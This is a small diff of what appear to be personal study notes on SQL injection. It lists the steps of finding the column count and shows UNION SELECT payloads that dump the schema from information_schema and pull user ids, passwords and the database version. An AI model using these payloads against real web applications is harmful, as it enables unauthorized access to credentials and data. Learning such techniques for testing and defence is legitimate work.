@@ -111,7 +111,7 @@ find amount of columns  (number of cloumns, how they are displayed ex. 1,3,2)
 reorder golden statement to match displayed columns
 ?selection=<num> UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #
 
-craft query
+craft query                     table names FROM table schema.column name
 ?selection-<num> UNION SELECT id,pass,@@version FROM session.user
                                         ^grabs version of database
 
